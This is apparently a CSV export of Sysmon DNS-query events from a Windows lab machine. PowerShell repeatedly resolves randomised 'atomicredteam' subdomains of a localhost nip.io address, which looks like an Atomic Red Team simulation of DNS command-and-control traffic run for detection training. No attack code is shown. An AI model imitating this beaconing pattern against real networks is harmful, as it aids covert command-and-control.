"2025-12-26 11:27:25.676 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174533,"Query: atomicredteam-258117.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:24.302","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:25.676 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174534,"Query: atomicredteam-97983.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:24.624","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:25.676 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174535,"Query: atomicredteam-251964.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:24.672","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:25.677 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174536,"Query: atomicredteam-842640.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:24.712","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:25.677 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174537,"Query: atomicredteam-843632.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:24.753","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:25.677 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174538,"Query: atomicredteam-479571.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:24.863","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:25.677 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174539,"Query: atomicredteam-97388.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:24.902","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:25.677 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174540,"Query: atomicredteam-264140.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:25.078","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:25.677 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174541,"Query: atomicredteam-61681.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:25.396","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:26.706 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174542,"Query: atomicredteam-795051.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:25.474","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:26.711 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174543,"Query: atomicredteam-611470.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:25.811","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:26.712 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174544,"Query: atomicredteam-433452.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:25.854","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:26.712 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174545,"Query: atomicredteam-588748.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:25.900","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:26.712 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174546,"Query: atomicredteam-399540.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:25.985","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:26.712 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174547,"Query: atomicredteam-969084.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:26.030","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:26.712 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174548,"Query: atomicredteam-703870.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:26.080","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:26.712 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174549,"Query: atomicredteam-769480.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:26.123","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:26.712 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174550,"Query: atomicredteam-510842.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:26.161","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:26.714 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174551,"Query: atomicredteam-415949.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:26.199","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:26.714 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174552,"Query: atomicredteam-199689.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:26.238","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:26.714 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174553,"Query: atomicredteam-108409.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:26.278","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:26.714 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174554,"Query: atomicredteam-108574.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:26.321","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:26.714 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174555,"Query: atomicredteam-314646.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:26.361","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:26.714 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174556,"Query: atomicredteam-210790.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:26.398","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:26.714 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174557,"Query: atomicredteam-459864.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:26.445","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:26.714 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174558,"Query: atomicredteam-778869.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:26.487","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:26.714 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174559,"Query: atomicredteam-636318.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:26.529","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:26.714 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174560,"Query: atomicredteam-609374.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:26.578","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:27.747 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174561,"Query: atomicredteam-571422.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:26.619","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:27.751 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174562,"Query: atomicredteam-975350.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:26.658","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:27.751 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174563,"Query: atomicredteam-170198.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:26.714","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:27.761 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174564,"Query: atomicredteam-998695.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:26.756","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:27.761 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174565,"Query: atomicredteam-669800.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:26.953","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:27.761 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174566,"Query: atomicredteam-134271.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:26.991","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:27.761 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174567,"Query: atomicredteam-65513.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:27.029","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:27.761 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174568,"Query: atomicredteam-7746.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:27.077","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:27.761 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174569,"Query: atomicredteam-308067.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:27.119","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:27.762 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174570,"Query: atomicredteam-599209.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:27.157","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:27.762 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174571,"Query: atomicredteam-645056.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:27.195","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:27.762 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174572,"Query: atomicredteam-417671.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:27.233","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:27.762 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174573,"Query: atomicredteam-28792.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:27.271","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:27.762 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174574,"Query: atomicredteam-157980.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:27.309","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:27.762 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174575,"Query: atomicredteam-583330.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:27.403","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:27.762 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174576,"Query: atomicredteam-258212.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:27.441","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:27.763 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174577,"Query: atomicredteam-15326.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:27.489","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:27.763 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174578,"Query: atomicredteam-890140.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:27.527","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:27.773 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174579,"Query: atomicredteam-194748.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:27.566","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:27:28.690 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174580,"Query: atomicredteam-720426.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:27:27.895","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
